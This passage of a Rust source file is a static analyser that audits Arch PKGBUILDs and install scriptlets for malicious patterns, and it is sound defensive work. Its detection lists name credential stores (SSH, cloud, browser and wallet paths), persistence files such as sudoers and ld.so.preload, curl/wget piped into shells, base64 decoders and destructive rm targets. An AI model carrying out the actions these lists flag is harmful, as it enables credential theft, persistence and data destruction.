//! Static analysis of a PKGBUILD (and its `.install` scriptlet) without
//! running any of it. A conservative reader pulls out the declarative fields
//! and the function bodies; pattern rules then flag what a reader should look
//! at. This is a reading aid, not a guarantee: it can miss obfuscation it
//! doesn't know and can flag legitimate code. See `docs/plan/r1/u15-audit.md`
//! and the severity policy in `docs/design/source-build.md`.

use serde::Serialize;

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize)]
#[serde(rename_all = "lowercase")]
pub enum Severity {
    /// Worth knowing.
    Info,
    /// Suspicious or sloppy; shown, nothing more.
    Warning,
    /// Dangerous but sometimes legitimate: emrac stops and asks.
    High,
    /// Severe and able to persist or spread: emrac refuses.
    Critical,
}

impl Severity {
    pub fn label(self) -> &'static str {
        match self {
            Severity::Info => "info",
            Severity::Warning => "warning",
            Severity::High => "HIGH",
            Severity::Critical => "CRITICAL",
        }
    }
}

#[derive(Debug, Clone, Serialize)]
pub struct Finding {
    pub rule: &'static str,
    pub severity: Severity,
    /// `PKGBUILD` or the scriptlet's file name.
    pub file: String,
    pub line: usize,
    pub message: String,
    pub excerpt: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "lowercase")]
pub enum Verdict {
    Allow,
    /// High findings: stop and ask the user, who may proceed.
    Confirm,
    /// Critical findings: emrac won't build this.
    Block,
}

#[derive(Debug, Clone, Serialize)]
pub struct AuditReport {
    pub target: String,
    /// Most severe first, then by file and line.
    pub findings: Vec<Finding>,
}

impl AuditReport {
    pub fn highest(&self) -> Option<Severity> {
        self.findings.iter().map(|f| f.severity).max()
    }

    pub fn verdict(&self) -> Verdict {
        match self.highest() {
            Some(Severity::Critical) => Verdict::Block,
            Some(Severity::High) => Verdict::Confirm,
            _ => Verdict::Allow,
        }
    }

    pub fn of_severity(&self, severity: Severity) -> impl Iterator<Item = &Finding> {
        self.findings.iter().filter(move |f| f.severity == severity)
    }
}

/// The `install=` scriptlet file name declared by `pkgbuild`, if any.
/// `$pkgname`-style references are expanded from the PKGBUILD's own plain
/// assignments (`install=$pkgname.install` is the common form).
pub fn scriptlet_name(pkgbuild: &str) -> Option<String> {
    let parsed = parse(pkgbuild);
    let value = |name: &str| {
        parsed
            .assignments
            .iter()
            .find(|a| a.name == name && !a.dynamic)
            .and_then(|a| a.items.first().cloned())
    };
    let mut name = value("install")?;
    for _ in 0..4 {
        if !name.contains('$') {
            break;
        }
        let mut out = String::new();
        let mut rest = name.as_str();
        while let Some(at) = rest.find('$') {
            out.push_str(&rest[..at]);
            rest = &rest[at + 1..];
            let (var, after) = match rest.strip_prefix('{') {
                Some(inner) => match inner.split_once('}') {
                    Some((v, a)) => (v, a),
                    None => break,
                },
                None => {
                    let end = rest
                        .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
                        .unwrap_or(rest.len());
                    (&rest[..end], &rest[end..])
                }
            };
            let v =
                value(var).or_else(|| (var == "pkgbase").then(|| value("pkgname")).flatten())?;
            out.push_str(&v);
            rest = after;
        }
        out.push_str(rest);
        name = out;
    }
    (!name.is_empty() && !name.contains(['$', '/'])).then_some(name)
}

/// A file from the package's repo other than the PKGBUILD and scriptlet.
#[derive(Debug, Clone)]
pub struct ExtraFile {
    /// Path inside the repo.
    pub path: String,
    pub bytes: Vec<u8>,
}

/// Audits a PKGBUILD, its scriptlet (`(file name, contents)`) and the other
/// files of the repo.
pub fn audit(
    target: &str,
    pkgbuild: &str,
    scriptlet: Option<(&str, &str)>,
    extras: &[ExtraFile],
) -> AuditReport {
    let (mut findings, facts) = audit_file_facts("PKGBUILD", pkgbuild, Mode::Pkgbuild);
    let mut all_facts: Vec<(String, Facts)> = vec![("PKGBUILD".to_string(), facts)];
    if let Some((name, text)) = scriptlet {
        let (f, facts) = audit_file_facts(name, text, Mode::Scriptlet);
        findings.extend(f);
        all_facts.push((name.to_string(), facts));
    }
    let scriptlet_name = scriptlet.map(|(n, _)| n);
    for extra in extras
        .iter()
        .filter(|e| e.path != "PKGBUILD" && Some(e.path.as_str()) != scriptlet_name)
        .take(MAX_EXTRA_FILES)
    {
        let (f, facts) = audit_extra(extra);
        findings.extend(f);
        all_facts.push((extra.path.clone(), facts));
    }
    correlate_across_files(&all_facts, &mut findings);
    sort_findings(&mut findings);
    AuditReport {
        target: target.to_string(),
        findings,
    }
}

/// An upload in one file and a credential read in another is the same
/// exfiltration as both in one: rate it critical. (Within a single file the
/// scan already does this.)
fn correlate_across_files(all: &[(String, Facts)], findings: &mut Vec<Finding>) {
    for (upload_file, facts) in all {
        if facts.uploads.is_empty() {
            continue;
        }
        let Some((secret_file, line)) = all
            .iter()
            .filter(|(f, _)| f != upload_file)
            .find_map(|(f, x)| x.secrets.first().map(|l| (f, *l)))
        else {
            continue;
        };
        for (no, text) in &facts.uploads {
            findings.push(Finding {
                rule: "exfiltration",
                severity: Severity::Critical,
                file: upload_file.clone(),
                line: *no,
                message: format!(
                    "sends data over the network, and {secret_file}:{line} reads credentials"
                ),
                excerpt: excerpt(text),
            });
        }
    }
}

/// Most severe first, then by file and line; repeats removed.
pub(crate) fn sort_findings(findings: &mut Vec<Finding>) {
    findings.sort_by(|a, b| {
        b.severity
            .cmp(&a.severity)
            .then_with(|| a.file.cmp(&b.file))
            .then_with(|| a.line.cmp(&b.line))
            .then_with(|| a.rule.cmp(b.rule))
    });
    findings.dedup_by(|a, b| a.rule == b.rule && a.file == b.file && a.line == b.line);
}

/// Runs the dangerous-pattern rules over a script (not the PKGBUILD-only
/// ones), labelling findings `file`.
pub(crate) fn scan_script(file: &str, text: &str) -> Vec<Finding> {
    audit_file(file, text, Mode::Script)
}

/// Runs the install-scriptlet rules (root-time code) over `text`.
pub(crate) fn scan_scriptlet(file: &str, text: &str) -> Vec<Finding> {
    audit_file(file, text, Mode::Scriptlet)
}

/// Names of the functions a scriptlet defines (`post_install`, …).
pub(crate) fn function_names(text: &str) -> Vec<String> {
    parse(text).functions.into_iter().map(|f| f.name).collect()
}

/// How many extra files are read; the rest are ignored.
pub const MAX_EXTRA_FILES: usize = 200;
const MAX_EXTRA_BYTES: usize = 1024 * 1024;

const DATA_EXTENSIONS: &[&str] = &[
    "md",
    "txt",
    "rst",
    "sig",
    "asc",
    "pub",
    "gpg",
    "kbx",
    "png",
    "jpg",
    "jpeg",
    "gif",
    "svg",
    "ico",
    "webp",
    "xpm",
    "ttf",
    "otf",
    "woff",
    "woff2",
    "json",
    "toml",
    "yml",
    "yaml",
    "conf",
    "cfg",
    "ini",
    "desktop",
    "xml",
    "html",
    "css",
    "po",
    "mo",
    "pc",
    "service",
    "timer",
    "socket",
    "sysusers",
    "tmpfiles",
    "rules",
    "1",
    "8",
    "gitignore",
    "gitattributes",
];
const SCRIPT_EXTENSIONS: &[&str] = &[
    "sh", "bash", "zsh", "ksh", "py", "pl", "rb", "js", "mjs", "lua", "php", "install", "hook",
];

/// Reads one non-PKGBUILD file of the repo. Findings are labelled with its
/// path.
fn audit_extra(extra: &ExtraFile) -> (Vec<Finding>, Facts) {
    let path = extra.path.as_str();
    let base = path.rsplit('/').next().unwrap_or(path);
    let lower = base.to_lowercase();
    let ext = lower.rsplit_once('.').map(|(_, e)| e).unwrap_or("");
    // A finding about the file as a whole; no credential/upload facts.
    let note = |rule: &'static str, severity, msg: &str| {
        (
            vec![Finding {
                rule,
                severity,
                file: path.to_string(),
                line: 1,
                message: msg.to_string(),
                excerpt: path.to_string(),
            }],
            Facts::default(),
        )
    };

    if matches!(
        base,
        "PKGBUILD" | ".SRCINFO" | ".gitignore" | ".gitattributes"
    ) || lower.starts_with("license")
        || lower.starts_with("copying")
        || lower.starts_with("readme")
        || DATA_EXTENSIONS.contains(&ext)
    {
        return (Vec::new(), Facts::default());
    }
    if extra.bytes.len() > MAX_EXTRA_BYTES {
        return note(
            "unscanned-file",
            Severity::Info,
            "is too large to scan; read it yourself if it matters",
        );
    }
    if extra.bytes.starts_with(b"\x7fELF") {
        return note(
            "committed-binary",
            Severity::High,
            "is a compiled executable committed to the repo; it can't be read and it isn't built from source",
        );
    }
    if extra.bytes.iter().take(8000).any(|b| *b == 0) {
        let archive = matches!(
            ext,
            "gz" | "xz" | "zst" | "bz2" | "zip" | "tar" | "tgz" | "7z"
        );
        return note(
            "opaque-file",
            Severity::Warning,
            if archive {
                "is an archive committed to the repo, which can't be inspected here"
            } else {
                "is a binary file that can't be inspected here"
            },
        );
    }

    let text = String::from_utf8_lossy(&extra.bytes);
    let is_patch = matches!(ext, "patch" | "diff") || text.starts_with("diff --git");
    if is_patch {
        // Only what the patch adds ends up in the code; keep line numbers.
        let added: String = text
            .lines()
            .map(|l| match l.strip_prefix('+') {
                Some(rest) if !l.starts_with("+++") => rest,
                _ => "",
            })
            .collect::<Vec<_>>()
            .join("\n");
        let findings = audit_file(path, &added, Mode::Script)
            .into_iter()
            .map(|mut f| {
                f.severity = f.severity.min(Severity::Warning);
                f.message = format!("(added by this patch) {}", f.message);
                f
            })
            .collect();
        return (findings, Facts::default());
    }
    if text.starts_with("#!") || SCRIPT_EXTENSIONS.contains(&ext) {
        return audit_file_facts(path, &text, Mode::Script);
    }
    (Vec::new(), Facts::default())
}

// ---------------------------------------------------------------- reader

#[derive(Debug)]
struct Assignment {
    name: String,
    items: Vec<String>,
    dynamic: bool,
    line: usize,
}

#[derive(Debug)]
struct Line {
    no: usize,
    text: String,
}

#[derive(Debug)]
struct Function {
    name: String,
    body: Vec<Line>,
}

#[derive(Debug, Default)]
struct Parsed {
    assignments: Vec<Assignment>,
    functions: Vec<Function>,
    /// Statements outside any function that are not assignments.
    toplevel: Vec<Line>,
}

/// Drops a trailing `# comment` (not inside quotes, at a word start).
fn strip_comment(s: &str) -> String {
    let (mut out, mut sq, mut dq, mut esc) = (String::new(), false, false, false);
    let mut prev_ws = true;
    for c in s.chars() {
        if esc {
            out.push(c);
            esc = false;
            prev_ws = false;
            continue;
        }
        match c {
            '\\' if !sq => {
                esc = true;
                out.push(c);
            }
            '\'' if !dq => {
                sq = !sq;
                out.push(c);
            }
            '"' if !sq => {
                dq = !dq;
                out.push(c);
            }
            '#' if !sq && !dq && prev_ws => break,
            _ => out.push(c),
        }
        prev_ws = c.is_whitespace();
    }
    out
}

/// Whether `s` ends inside a quote.
fn unterminated(s: &str) -> bool {
    let (mut sq, mut dq, mut esc) = (false, false, false);
    for c in s.chars() {
        if esc {
            esc = false;
            continue;
        }
        match c {
            '\\' if !sq => esc = true,
            '\'' if !dq => sq = !sq,
            '"' if !sq => dq = !dq,
            _ => {}
        }
    }
    sq || dq
}

/// Shell-ish word splitting; quotes are removed, their content kept.
fn tokenize(s: &str) -> Vec<String> {
    let mut tokens = Vec::new();
    let (mut cur, mut has) = (String::new(), false);
    let (mut sq, mut dq, mut esc) = (false, false, false);
    for c in s.chars() {
        if esc {
            cur.push(c);
            esc = false;
            has = true;
            continue;
        }
        match c {
            '\\' if !sq => esc = true,
            '\'' if !dq => {
                sq = !sq;
                has = true;
            }
            '"' if !sq => {
                dq = !dq;
                has = true;
            }
            c if c.is_whitespace() && !sq && !dq => {
                if has {
                    tokens.push(std::mem::take(&mut cur));
                    has = false;
                }
            }
            c => {
                cur.push(c);
                has = true;
            }
        }
    }
    if has {
        tokens.push(cur);
    }
    tokens
}

/// Is this line the start of a `name=(` array assignment?
fn starts_array(text: &str) -> bool {
    assignment_split(text.trim()).is_some_and(|(_, v)| v.trim_start().starts_with('('))
}

/// Joins lines ending in a backslash, and multi-line `name=( … )` arrays,
/// into one logical line, so the continued part (arguments, array items) is
/// not mistaken for commands of its own.
fn join_continuations(lines: Vec<Line>) -> Vec<Line> {
    let mut out: Vec<Line> = Vec::new();
    let mut joining = false;
    let mut parens = 0i32;
    for line in lines {
        let continues = line.text.trim_end().ends_with('\\');
        let text = if continues {
            line.text.trim_end().trim_end_matches('\\').to_string()
        } else {
            line.text
        };
        match (joining || parens > 0, out.last_mut()) {
            (true, Some(prev)) => {
                prev.text.push(' ');
                prev.text.push_str(text.trim_start());
                parens = if starts_array(&prev.text) {
                    brace_delta(&prev.text).1
                } else {
                    0
                };
            }
            _ => {
                parens = if starts_array(&text) {
                    brace_delta(&text).1
                } else {
                    0
                };
                out.push(Line { no: line.no, text });
            }
        }
        joining = continues;
    }
    out
}

/// Net `{`/`}` and `(`/`)` outside quotes.
fn brace_delta(s: &str) -> (i32, i32) {
    let (mut sq, mut dq, mut esc) = (false, false, false);
    let (mut braces, mut parens) = (0, 0);
    for c in s.chars() {
        if esc {
            esc = false;
            continue;
        }
        match c {
            '\\' if !sq => esc = true,
            '\'' if !dq => sq = !sq,
            '"' if !sq => dq = !dq,
            '{' if !sq && !dq => braces += 1,
            '}' if !sq && !dq => braces -= 1,
            '(' if !sq && !dq => parens += 1,
            ')' if !sq && !dq => parens -= 1,
            _ => {}
        }
    }
    (braces, parens)
}

/// The terminator of a heredoc started on this line, if any.
fn heredoc_tag(line: &str) -> Option<String> {
    let at = line.find("<<")?;
    let rest = &line[at + 2..];
    if rest.starts_with('<') {
        return None; // here-string
    }
    let rest = rest.strip_prefix('-').unwrap_or(rest).trim_start();
    let tag: String = rest
        .trim_start_matches(['\'', '"'])
        .chars()
        .take_while(|c| c.is_alphanumeric() || *c == '_')
        .collect();
    (!tag.is_empty()).then_some(tag)
}

fn is_dynamic(s: &str) -> bool {
    s.contains("$(") || s.contains('`') || s.contains("<(")
}

fn is_ident_start(c: char) -> bool {
    c.is_ascii_alphabetic() || c == '_'
}

/// Drops a leading `declare -gA` / `local` / `export` / … so what follows
/// can be read as a plain assignment.
fn strip_decl_prefix(t: &str) -> &str {
    let mut rest = t;
    let Some(first) = rest.split_whitespace().next() else {
        return t;
    };
    if !matches!(
        first,
        "declare" | "typeset" | "local" | "readonly" | "export"
    ) {
        return t;
    }
    rest = rest[first.len()..].trim_start();
    while rest.starts_with('-') {
        let end = rest.find(char::is_whitespace).unwrap_or(rest.len());
        rest = rest[end..].trim_start();
    }
    rest
}

/// `name=…` / `name+=…` / `name[i]=…` → `(name, value)`.
fn assignment_split(t: &str) -> Option<(&str, &str)> {
    let t = strip_decl_prefix(t);
    let end = t
        .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
        .unwrap_or(t.len());
    let name = &t[..end];
    if name.is_empty() || !is_ident_start(name.chars().next()?) {
        return None;
    }
    let mut rest = &t[end..];
    if rest.starts_with('[') {
        rest = &rest[rest.find(']')? + 1..];
    }
    let rest = rest.strip_prefix('+').unwrap_or(rest);
    rest.strip_prefix('=').map(|value| (name, value))
}

/// `name() {…`, `function name {…` → `(name, text after the header)`.
fn function_header(t: &str) -> Option<(String, &str)> {
    let (keyword, t) = match t.strip_prefix("function ") {
        Some(rest) => (true, rest.trim_start()),
        None => (false, t),
    };
    let end = t
        .find(|c: char| !(c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.' | ':' | '+')))
        .unwrap_or(t.len());
    let name = &t[..end];
    if name.is_empty() {
        return None;
    }
    let rest = t[end..].trim_start();
    let rest = match rest.strip_prefix('(') {
        Some(after) => after.trim_start().strip_prefix(')')?.trim_start(),
        None if keyword => rest,
        None => return None,
    };
    Some((name.to_string(), rest))
}

fn parse(text: &str) -> Parsed {
    let raw: Vec<&str> = text.lines().collect();
    let mut parsed = Parsed::default();
    let mut i = 0;

    while i < raw.len() {
        let no = i + 1;
        let stripped = strip_comment(raw[i]);
        let t = stripped.trim();
        if t.is_empty() {
            i += 1;
            continue;
        }

        if let Some((name, rest)) = function_header(t) {
            let mut body = Vec::new();
            let (mut depth, mut opened) = (0i32, false);
            let mut heredoc: Option<String> = None;
            let mut pending = Some((no, rest.to_string()));
            loop {
                let (line_no, line_text) = match pending.take() {
                    Some(first) => first,
                    None => {
                        i += 1;
                        if i >= raw.len() {
                            break;
                        }
                        (i + 1, strip_comment(raw[i]))
                    }
                };
                if let Some(tag) = &heredoc {
                    if line_text.trim() == tag {
                        heredoc = None;
                    }
                    continue;
                }
                let (braces, _) = brace_delta(&line_text);
                if line_text.contains('{') {
                    opened = true;
                }
                depth += braces;
                if heredoc.is_none() {
                    heredoc = heredoc_tag(&line_text);
                }
                if !line_text.trim().is_empty() {
                    body.push(Line {
                        no: line_no,
                        text: line_text,
                    });
                }
                if opened && depth <= 0 {
                    break;
                }
            }
            parsed.functions.push(Function {
                name,
                body: join_continuations(body),
            });
            i += 1;
            continue;
        }

        if let Some((name, value)) = assignment_split(t) {
            let mut acc = value.to_string();
            let is_array = value.trim_start().starts_with('(');
            let mut last = i;
            loop {
                let open_paren = is_array && brace_delta(&acc).1 > 0;
                if !(open_paren || unterminated(&acc)) || last + 1 >= raw.len() {
                    break;
                }
                last += 1;
                acc.push('\n');
                acc.push_str(&strip_comment(raw[last]));
            }
            let dynamic = is_dynamic(&acc);
            let inner = acc.trim();
            let inner = if is_array {
                inner
                    .strip_prefix('(')
                    .map(|s| s.trim_end().trim_end_matches(')'))
                    .unwrap_or(inner)
            } else {
                inner
            };
            let mut items = tokenize(inner);
            if !is_array {
                // `VAR=value command args…` runs `command` with VAR set; it is
                // a command, not just an assignment.
                if items.len() > 1 {
                    parsed.toplevel.push(Line {
                        no,
                        text: format!("{name}={}", acc.replace('\n', " ")),
                    });
                }
                items.truncate(1);
            }
            if dynamic {
                // `x=$(curl … | sh)` runs when the file is merely read.
                parsed.toplevel.push(Line {
                    no,
                    text: format!("{name}={}", acc.replace('\n', " ")),
                });
            }
            parsed.assignments.push(Assignment {
                name: name.to_string(),
                items,
                dynamic,
                line: no,
            });
            i = last + 1;
            continue;
        }

        parsed.toplevel.push(Line { no, text: stripped });
        i += 1;
    }
    parsed.toplevel = join_continuations(std::mem::take(&mut parsed.toplevel));
    parsed
}

// ----------------------------------------------------------------- rules

/// A simple command: a pipeline stage.
struct Stage {
    /// The command actually run, after wrappers like `sudo` or `env`.
    cmd: String,
    /// Asked for elevated privileges (`sudo`, `doas`, `pkexec`, `run0`, `su`).
    privileged: bool,
    /// The command word is a bare variable or substitution (`$a$b`).
    dynamic: bool,
    args: Vec<String>,
    /// Receives the previous stage's output.
    piped: bool,
    text: String,
}

fn split_stages(line: &str) -> Vec<(String, bool)> {
    let mut out: Vec<(String, bool)> = Vec::new();
    let (mut cur, mut next_piped) = (String::new(), false);
    let (mut sq, mut dq, mut esc) = (false, false, false);
    let chars: Vec<char> = line.chars().collect();
    let mut i = 0;
    let flush = |cur: &mut String, piped: bool, out: &mut Vec<(String, bool)>| {
        if !cur.trim().is_empty() {
            out.push((cur.trim().to_string(), piped));
        }
        cur.clear();
    };
    while i < chars.len() {
        let c = chars[i];
        if esc {
            cur.push(c);
            esc = false;
            i += 1;
            continue;
        }
        match c {
            '\\' if !sq => {
                esc = true;
                cur.push(c);
            }
            '\'' if !dq => {
                sq = !sq;
                cur.push(c);
            }
            '"' if !sq => {
                dq = !dq;
                cur.push(c);
            }
            ';' if !sq && !dq => {
                flush(&mut cur, next_piped, &mut out);
                next_piped = false;
            }
            '&' if !sq && !dq && chars.get(i + 1) == Some(&'&') => {
                flush(&mut cur, next_piped, &mut out);
                next_piped = false;
                i += 1;
            }
            '|' if !sq && !dq => {
                let double = chars.get(i + 1) == Some(&'|');
                flush(&mut cur, next_piped, &mut out);
                next_piped = !double;
                if double {
                    i += 1;
                }
            }
            _ => cur.push(c),
        }
        i += 1;
    }
    flush(&mut cur, next_piped, &mut out);
    out
}

const KEYWORDS: &[&str] = &[
    "!", "if", "then", "else", "elif", "fi", "do", "done", "while", "until", "for", "case", "esac",
    "time", "{", "}", "(", ")", "function",
];

fn is_var_assignment(tok: &str) -> bool {
    assignment_split(tok).is_some() && !tok.starts_with('=')
}

/// Wrappers that run another command, and whether each one elevates.
const WRAPPERS: &[(&str, bool)] = &[
    ("sudo", true),
    ("doas", true),
    ("pkexec", true),
    ("run0", true),
    ("env", false),
    ("nice", false),
    ("ionice", false),
    ("nohup", false),
    ("exec", false),
    ("command", false),
    ("stdbuf", false),
    ("timeout", false),
];
/// `sudo`-style options that take a value.
const WRAPPER_VALUE_FLAGS: &[&str] = &["-u", "-g", "-C", "-h", "-p", "-r", "-t", "-U", "-D", "-R"];

fn stage_of(text: &str, piped: bool) -> Stage {
    let tokens = tokenize(text);
    let mut idx = 0;
    // The word that is really being run, when it hides inside `x=$(cmd …`.
    let mut inner: Option<String> = None;
    // `case $x in`, `for i in …` and `name=( … )` have no command word.
    let mut no_command = false;
    while idx < tokens.len() {
        let tok = tokens[idx].as_str();
        if KEYWORDS.contains(&tok) {
            if matches!(tok, "case" | "for" | "select") {
                no_command = true;
                break;
            }
            idx += 1;
        } else if is_var_assignment(tok) {
            let value = tok.split_once('=').map(|(_, v)| v).unwrap_or("");
            if value.starts_with('(') {
                no_command = true;
                break;
            }
            // `x=$(basename "$0")`: what runs is `basename`, not `"$0"`.
            let start = value
                .rfind("$(")
                .map(|i| i + 2)
                .or_else(|| value.rfind('`').map(|i| i + 1));
            idx += 1;
            if let Some(at) = start {
                if at < value.len() {
                    inner = Some(value[at..].to_string());
                    break;
                }
            }
        } else {
            break;
        }
    }
    let mut privileged = false;
    let first_word: Option<&str> = if no_command {
        None
    } else {
        inner
            .as_deref()
            .or_else(|| tokens.get(idx).map(String::as_str))
    };
    let mut dynamic = first_word.is_some_and(is_dynamic_command_word);
    let basename = |word: &str| {
        let word = word
            .trim_start_matches(['$', '(', '{', '`'])
            .trim_end_matches([')', '}', '`']);
        word.rsplit('/').next().unwrap_or(word).to_string()
    };
    let mut cmd = first_word
        .filter(|w| !w.starts_with('-'))
        .map(basename)
        .unwrap_or_default();
    if !cmd.is_empty() && inner.is_none() {
        idx += 1;
    }
    // `su` hands its command to a shell: counted as elevation, not unwrapped.
    if cmd == "su" {
        privileged = true;
    }
    while let Some((_, elevates)) = WRAPPERS.iter().find(|(w, _)| *w == cmd) {
        privileged |= *elevates;
        let mut skip_timeout_duration = cmd == "timeout";
        let mut next = None;
        while idx < tokens.len() {
            let tok = &tokens[idx];
            idx += 1;
            if tok.starts_with('-') {
                if WRAPPER_VALUE_FLAGS.contains(&tok.as_str()) {
                    idx += 1;
                }
                continue;
            }
            if is_var_assignment(tok) {
                continue;
            }
            if skip_timeout_duration {
                skip_timeout_duration = false;
                continue;
            }
            dynamic = is_dynamic_command_word(tok);
            next = Some(basename(tok));
            break;
        }
        match next {
            Some(n) => cmd = n,
            None => {
                cmd = String::new();
                break;
            }
        }
    }
    let args = tokens
        .get(idx..)
        .map(<[String]>::to_vec)
        .unwrap_or_default();
    Stage {
        cmd,
        privileged,
        dynamic,
        args,
        piped,
        text: text.to_string(),
    }
}

/// Is the first word an ANSI-C string of several hex/octal escapes
/// (`$'\x63\x75\x72\x6c'`), i.e. a command name spelled out to hide it? A
/// lone colour code like `$'\033[1m'` is not.
fn spelled_with_escapes(stage_text: &str) -> bool {
    let Some(rest) = stage_text.strip_prefix("$'") else {
        return false;
    };
    let Some(end) = rest.find('\'') else {
        return false;
    };
    let word = &rest[..end];
    let escapes = word.matches("\\x").count()
        + word
            .match_indices('\\')
            .filter(|(i, _)| {
                word[i + 1..]
                    .chars()
                    .next()
                    .is_some_and(|c| ('0'..='3').contains(&c))
            })
            .count();
    escapes >= 3 && !word.contains(' ')
}

/// Variables that are conventionally tools, so `$CC -o x y.c` is ordinary.
const TOOL_VARS: &[&str] = &[
    "CC",
    "CXX",
    "CPP",
    "LD",
    "AR",
    "AS",
    "NM",
    "RANLIB",
    "STRIP",
    "OBJCOPY",
    "MAKE",
    "CMAKE",
    "PYTHON",
    "PERL",
    "RUBY",
    "NODE",
    "GO",
    "CARGO",
    "RUSTC",
    "GCC",
    "GXX",
    "CLANG",
    "MESON",
    "NINJA",
    "PKG_CONFIG",
    "SHELL",
    "EDITOR",
    "CONFIG_SHELL",
];

/// `$cmd`, `${a}${b}`, `$(…)` or a backtick as the command word, with no
/// path in it and not one of the usual tool variables.
fn is_dynamic_command_word(word: &str) -> bool {
    if word.contains('/') {
        return false;
    }
    if word.starts_with("$(") || word.starts_with('`') {
        return true;
    }
    let Some(rest) = word.strip_prefix('$') else {
        return false;
    };
    let rest = rest.strip_prefix('{').unwrap_or(rest);
    let name: String = rest
        .chars()
        .take_while(|c| c.is_ascii_alphanumeric() || *c == '_')
        .collect();
    !name.is_empty()
        && name.chars().next().is_some_and(is_ident_start)
        && !TOOL_VARS.contains(&name.as_str())
}

/// Files a fetcher stage writes, by base name.
fn download_targets(stage: &Stage) -> Vec<String> {
    let base = |p: &str| {
        let p = p.split(['?', '#']).next().unwrap_or(p);
        p.rsplit('/').next().unwrap_or(p).to_string()
    };
    let mut out = Vec::new();
    let args = &stage.args;
    let mut named = false;
    for (i, a) in args.iter().enumerate() {
        let value = match a.as_str() {
            "-o" | "--output" | "--output-document" => args.get(i + 1).cloned(),
            // wget's -O takes a name; curl's -O means "use the URL's name".
            "-O" if stage.cmd != "curl" => args.get(i + 1).cloned(),
            _ => a
                .strip_prefix("--output=")
                .or_else(|| a.strip_prefix("--output-document="))
                .or_else(|| {
                    a.strip_prefix("-o")
                        .filter(|v| !v.is_empty() && !v.starts_with('-'))
                })
                .map(str::to_string),
        };
        if let Some(v) = value.filter(|v| v != "-") {
            out.push(base(&v));
            named = true;
        }
    }
    // `curl -O url` / plain `wget url` save under the URL's own name.
    let remote_name = stage.cmd == "curl" && args.iter().any(|a| a == "-O" || a == "--remote-name");
    if !named || remote_name {
        out.extend(args.iter().filter(|a| a.contains("://")).map(|u| base(u)));
    }
    // Output sent to /dev/null, /dev/stderr and the like saves no file.
    out.extend(
        redirect_targets(&stage.text)
            .iter()
            .filter(|t| !t.starts_with("/dev/"))
            .map(|t| base(t)),
    );
    out.retain(|n| !n.is_empty());
    out
}

/// Targets of unquoted `>`/`>>` redirections in `s`.
fn redirect_targets(s: &str) -> Vec<String> {
    let chars: Vec<char> = s.chars().collect();
    let (mut sq, mut dq, mut esc) = (false, false, false);
    let mut out = Vec::new();
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        if esc {
            esc = false;
        } else {
            match c {
                '\\' if !sq => esc = true,
                '\'' if !dq => sq = !sq,
                '"' if !sq => dq = !dq,
                '>' if !sq && !dq => {
                    let mut j = i + 1;
                    if chars.get(j) == Some(&'>') {
                        j += 1;
                    }
                    if chars.get(j) == Some(&'&') {
                        i = j;
                        continue;
                    }
                    let rest: String = chars[j..].iter().collect();
                    if let Some(first) = tokenize(&rest).into_iter().next() {
                        out.push(first);
                    }
                    i = j;
                    continue;
                }
                _ => {}
            }
        }
        i += 1;
    }
    out
}

const SHELLS: &[&str] = &[
    "sh", "bash", "zsh", "dash", "ksh", "fish", "python", "python3", "perl", "ruby", "node", "php",
    "lua", "eval", "source", ".",
];
const FETCHERS: &[&str] = &["curl", "wget", "fetch", "aria2c"];
const DECODERS: &[&str] = &[
    "base64 -d",
    "base64 --decode",
    "base64 -D",
    "xxd -r",
    "openssl enc -d",
    "openssl base64 -d",
    "b64decode",
];
/// Files whose modification is persistence or a takeover however it
/// happens: SSH keys, preload, sudo, accounts, scheduled jobs.
const TRUST_PATHS: &[&str] = &[
    "authorized_keys",
    "ld.so.preload",
    "/etc/sudoers",
    "/etc/passwd",
    "/etc/shadow",
    "/etc/crontab",
    "/etc/rc.local",
];
/// Shell startup files and autostart: critical in a PKGBUILD (a build has no
/// business editing them), high in an install scriptlet or shipped script
/// (some legitimate packages append a `source` line for their tool).
const STARTUP_PATHS: &[&str] = &[
    ".bashrc",
    ".bash_profile",
    ".bash_login",
    ".bash_logout",
    ".zshrc",
    ".zshenv",
    ".zprofile",
    ".profile",
    "/etc/profile",
    ".config/autostart",
];
const SECRET_PATHS: &[&str] = &[
    "/.ssh",
    "/.gnupg",
    "/.aws",
    "/.kube",
    "/.config/gcloud",
    "/.netrc",
    "/.docker/config",
    "/.mozilla",
    "/.config/google-chrome",
    "/.config/chromium",
    "/.config/BraveSoftware",
    "Login Data",
    "/.password-store",
    "/.local/share/keyrings",
    "/.bitcoin",
    "/.electrum",
];
const DANGEROUS_RM_TARGETS: &[&str] = &[
    "/",
    "/*",
    "~",
    "~/",
    "~/*",
    "$HOME",
    "$HOME/",
    "$HOME/*",
    "${HOME}",
    "${HOME}/",
    "${HOME}/*",
    "/home",
    "/home/*",
    "/etc",
    "/etc/*",
    "/usr",
    "/usr/*",
    "/var",
    "/var/*",
    "/boot",
    "/boot/*",
    "/bin",
    "/lib",
    "/root",
    "/root/*",
];
const HOST_CHANGING_CMDS: &[(&str, &str)] = &[
    ("modprobe", "loads a kernel module"),
    ("insmod", "loads a kernel module"),
    ("rmmod", "unloads a kernel module"),
    ("mount", "mounts a filesystem"),
    ("umount", "unmounts a filesystem"),
    ("iptables", "changes firewall rules"),
    ("ip6tables", "changes firewall rules"),
    ("nft", "changes firewall rules"),
    ("ufw", "changes firewall rules"),
    ("useradd", "creates a user (use sysusers.d)"),
    ("groupadd", "creates a group (use sysusers.d)"),
    ("usermod", "modifies a user"),
    ("gpasswd", "modifies group membership"),
    ("passwd", "changes a password"),
    ("chpasswd", "changes passwords"),
    ("crontab", "schedules a job on the build host"),
    ("pacman", "runs pacman from inside the build"),
];
const SERVICE_ACTIONS: &[&str] = &[
    "enable", "disable", "start", "stop", "restart", "mask", "unmask", "isolate", "reboot",
    "poweroff", "halt",
];

/// Does this `pacman` invocation install, remove, upgrade or change the
/// database? (`-T`, `-Q…`, `-Ss`, `-Si` and friends only read.)
fn pacman_mutates(args: &[String]) -> bool {
    args.iter().any(|a| {
        let Some(op) = a.strip_prefix('-').filter(|o| !o.starts_with('-')) else {
            return matches!(
                a.as_str(),
                "--sync" | "--remove" | "--upgrade" | "--database"
            );
        };
        let mut chars = op.chars();
        match chars.next() {
